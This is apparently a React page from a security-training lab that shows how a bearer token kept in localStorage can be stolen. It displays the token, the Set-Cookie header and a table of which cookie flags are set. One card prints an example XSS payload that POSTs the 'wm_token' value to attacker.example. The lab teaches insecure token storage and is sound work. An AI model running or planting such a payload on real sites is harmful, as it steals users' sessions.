import LabShell from '../components/labs/LabShell';
import Card from '../components/common/Card';
import CodeBlock from '../components/common/CodeBlock';
import { useLabs } from '../context/LabContext';

export default function TokenStorageLab({ lab }) {
  const { resultFor } = useLabs();
  const result = resultFor('token_storage');

  return (
    <LabShell lab={lab} onRun={() => ({})}>
      {result && (
        <>
          <Card title="Token issued to the SPA">
            <CodeBlock caption="Bearer token" code={result.response.token} wrap variant="vuln" />
            <div className="mt-16">
              <CodeBlock caption="Set-Cookie header received" variant="vuln" wrap
                code={result.response.setCookieReceived} />
            </div>
            <table className="table mt-16">
              <thead><tr><th>Flag</th><th>Present</th></tr></thead>
              <tbody>
                {Object.entries(result.response.cookieFlags).map(([k, v]) => (
                  <tr key={k}>
                    <td><code>{k}</code></td>
                    <td>
                      <span className={`badge badge--${v ? 'ok' : 'critical'}`}>
                        {v ? 'yes' : 'no'}
                      </span>
                    </td>
                  </tr>
                ))}
              </tbody>
            </table>
          </Card>

          <Card title="Exploitation via the XSS from WM-001">
            <CodeBlock wrap variant="vuln"
              code={`// Payload delivered via the reflected XSS in the monitor name
fetch('https://attacker.example/collect', {
  method: 'POST',
  body: localStorage.getItem('wm_token'),
});
// The attacker now holds a live session token and can replay it from anywhere.`} />
          </Card>
        </>
      )}
    </LabShell>
  );
}